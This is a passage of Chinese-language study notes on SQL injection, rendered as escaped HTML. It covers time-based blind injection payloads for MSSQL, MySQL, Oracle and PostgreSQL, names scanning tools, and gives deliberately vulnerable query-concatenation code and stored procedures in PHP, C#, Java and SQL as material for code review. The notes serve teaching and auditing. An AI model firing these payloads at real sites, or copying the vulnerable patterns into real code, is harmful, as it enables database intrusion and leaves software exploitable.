&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;waitfor&lt;/span&gt; delay &lt;span class=&#34;token string&#34;&gt;&#39;0:0:5&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个payload意义就是让数据库延迟5秒返回数据&lt;/p&gt;
&lt;p&gt;mysql种没有时间延迟的函数，它使用一些执行时间很长的函数，来引入延迟。比如&lt;code&gt;benchmark&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;benchmark&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;tets&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;将后面的命令执行10000次，这样时间就长了，为了更明显，可以增大次数&lt;/p&gt;
&lt;p&gt;oracle PL/SQL&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
DBMS_LOCK&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SLEEP&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#休眠五秒&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;限制：不能直接子查询，管理员才能使用DBMS_LOCK包&lt;/p&gt;
&lt;p&gt;另一个方法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; l&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;dbms_pipe&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;receive_ message&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;RDS&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒&lt;/p&gt;
&lt;p&gt;PostgreSQL&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;pg_sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;自动寻找SQL注入&#34;&gt;&lt;a href=&#34;#自动寻找SQL注入&#34; class=&#34;headerlink&#34; title=&#34;自动寻找SQL注入&#34;&gt;&lt;/a&gt;自动寻找SQL注入&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;识别数据输入&lt;/li&gt;
&lt;li&gt;注入数据&lt;/li&gt;
&lt;li&gt;检测响应中的异常&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;工具&#34;&gt;&lt;a href=&#34;#工具&#34; class=&#34;headerlink&#34; title=&#34;工具&#34;&gt;&lt;/a&gt;工具&lt;/h4&gt;&lt;h5 id=&#34;HP-WebInspect&#34;&gt;&lt;a href=&#34;#HP-WebInspect&#34; class=&#34;headerlink&#34; title=&#34;HP WebInspect&#34;&gt;&lt;/a&gt;HP WebInspect&lt;/h5&gt;&lt;h5 id=&#34;IBM-Rational-AppScan&#34;&gt;&lt;a href=&#34;#IBM-Rational-AppScan&#34; class=&#34;headerlink&#34; title=&#34;IBM Rational AppScan&#34;&gt;&lt;/a&gt;IBM Rational AppScan&lt;/h5&gt;&lt;h5 id=&#34;HP-Scrawlr&#34;&gt;&lt;a href=&#34;#HP-Scrawlr&#34; class=&#34;headerlink&#34; title=&#34;HP Scrawlr&#34;&gt;&lt;/a&gt;HP Scrawlr&lt;/h5&gt;&lt;h5 id=&#34;SQLiX&#34;&gt;&lt;a href=&#34;#SQLiX&#34; class=&#34;headerlink&#34; title=&#34;SQLiX&#34;&gt;&lt;/a&gt;SQLiX&lt;/h5&gt;&lt;h5 id=&#34;Paros-Proxy-Zed-Attack-Proxy&#34;&gt;&lt;a href=&#34;#Paros-Proxy-Zed-Attack-Proxy&#34; class=&#34;headerlink&#34; title=&#34;Paros Proxy/Zed Attack Proxy&#34;&gt;&lt;/a&gt;Paros Proxy/Zed Attack Proxy&lt;/h5&gt;&lt;h2 id=&#34;复查代码中的SQL注入&#34;&gt;&lt;a href=&#34;#复查代码中的SQL注入&#34; class=&#34;headerlink&#34; title=&#34;复查代码中的SQL注入&#34;&gt;&lt;/a&gt;复查代码中的SQL注入&lt;/h2&gt;&lt;p&gt;在代码中找bug，有代码审计的味道，审计的是sql代码&lt;/p&gt;
&lt;h3 id=&#34;复查源代码中的SQL注入&#34;&gt;&lt;a href=&#34;#复查源代码中的SQL注入&#34; class=&#34;headerlink&#34; title=&#34;复查源代码中的SQL注入&#34;&gt;&lt;/a&gt;复查源代码中的SQL注入&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;静态代码分析：分析源代码，但不执行&lt;/li&gt;
&lt;li&gt;动态代码分析：在执行代码是分析&lt;/li&gt;
&lt;li&gt;渗入点(安全敏感函数)：易受攻击的位置&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从渗入点进入审查，找到注入参数的位置，分析函数&lt;/p&gt;
&lt;h4 id=&#34;危险的编码行为&#34;&gt;&lt;a href=&#34;#危险的编码行为&#34; class=&#34;headerlink&#34; title=&#34;危险的编码行为&#34;&gt;&lt;/a&gt;危险的编码行为&lt;/h4&gt;&lt;h5 id=&#34;将未验证的输入拼接成SQL语句并执行&#34;&gt;&lt;a href=&#34;#将未验证的输入拼接成SQL语句并执行&#34; class=&#34;headerlink&#34; title=&#34;将未验证的输入拼接成SQL语句并执行&#34;&gt;&lt;/a&gt;将未验证的输入拼接成SQL语句并执行&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;//在PHP中执行一条动态构造的SQL语句&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT * FROM table WHERE field = &#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;/span&gt;[&#34;&lt;/span&gt;input&#34;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-c#&#34; data-language=&#34;c#&#34;&gt;&lt;code class=&#34;language-c#&#34;&gt;//在C#中执行一条动态构造的SQL语句
SqlCommand command = new SqlCommmand(&#34;SELECT * FROM table WHERE field = &#39;&#34; + request.getParameter (&#34;input&#34;) + &#34;&#39;&#34; ,connection); &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;//在Java中执行一条动态构造的SQL语句&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;ResultSet&lt;/span&gt; rs &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; s&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;executeQuery&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM table WHERE field = &#39;&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getParameter &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;存储过程也会有SQL注入&#34;&gt;&lt;a href=&#34;#存储过程也会有SQL注入&#34; class=&#34;headerlink&#34; title=&#34;存储过程也会有SQL注入&#34;&gt;&lt;/a&gt;存储过程也会有SQL注入&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;// MS SQL Server中易受攻击的存储过程&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PROCEDURE&lt;/span&gt; SP_StoredProcedure &lt;span class=&#34;token variable&#34;&gt;@input&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; nvarchar&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;SELECT field FROM table WHERE field =&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@input&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39;&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;// MySQL中易受攻击的存储过程&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PROCEDURE&lt;/span&gt; SP_StoredProcedure &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;input &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@param&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; input&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SELECT field FROM table WHERE field=&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@param&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;PREPARE&lt;/span&gt; stmt &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; stmt&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DEALLOCATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PREPARE&lt;/span&gt; stmt&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;End&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;--Oracle中易受攻击的存储过程&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PROCEDURE&lt;/span&gt; SP_StoredProcedure &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;input &lt;span class=&#34;token operator&#34;&gt;IN&lt;/span&gt; VARCHAR2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt; VARCHAR2&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt; :&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SELECT field FROM table WHERE field = &#39;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; input &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; IMMEDIATE &lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;//在PHP中动态地执行SQL存储过程&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;select SP_StoredProcedure(&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;input&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/span&gt;)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token comment&#34;&gt;//在C#中动态地执行SQL存储过程&lt;/span&gt;
SqlCommand cmd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;SqlCommand&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SP_StoredProceduren&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; conn&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
cmd&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;CommandType &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; CommandType&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;StoredProcedure&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
cmd&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;Parameters&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;Add&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;SqlParameter&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;@input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
request&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getParameter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
SqlDataReader rdr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; cmd&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ExecteReader&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//在Java中动态地执行SQL存储过程&lt;/span&gt;
CallableStatement cs &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; con&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;prepareCall&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;{call SP_StoredProcedure request.getParameter(&#34;&lt;/span&gt;input&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;)}&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword type-declaration&#34;&gt;string&lt;/span&gt; output &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; cs&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;executeUpdate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;PHP中HTTP函数&#34;&gt;&lt;a href=&#34;#PHP中HTTP函数&#34; class=&#34;headerlink&#34; title=&#34;PHP中HTTP函数&#34;&gt;&lt;/a&gt;PHP中HTTP函数&lt;/h5&gt;&lt;p&gt;php表单提交有两种方式：GET、POST&lt;/p&gt;
&lt;p&gt;GET方式显式提交，地址栏可以看到请求参数，并且有大小限制&lt;/p&gt;
&lt;p&gt;&lt;code&gt;test.php?id=1&amp;amp;num=2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;POST隐式提交，需要抓包才能看到参数，没有大小限制&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;amp;&lt;/code&gt; &lt;code&gt;;&lt;/code&gt;分割参数，&lt;code&gt;=&lt;/code&gt;分割参数名称和值&lt;/p&gt;
&lt;p&gt;一种特殊的参数&lt;code&gt;cookie&lt;/code&gt;通常保存在服务器上用于验证&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;：一个关联数组，存放通过&lt;span class=&#34;token constant&#34;&gt;HTTP&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;GET&lt;/span&gt;方法传递的变量。
&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$HTTP_GET_VARS&lt;/span&gt;：与&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;相同，在&lt;span class=&#34;token constant&#34;&gt;PHP&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4.1&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt; 中已弃用。
&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$HTTP_GET_VARS&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;：一个关联数组，存放通过&lt;span class=&#34;token constant&#34;&gt;HTTP&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;POST&lt;/span&gt;方法传递的变量。
&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$HTTP_POST_VARS&lt;/span&gt;：与&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt; 相同，在&lt;span class=&#34;token constant&#34;&gt;PHP&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4.1&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt; 中已弃用。
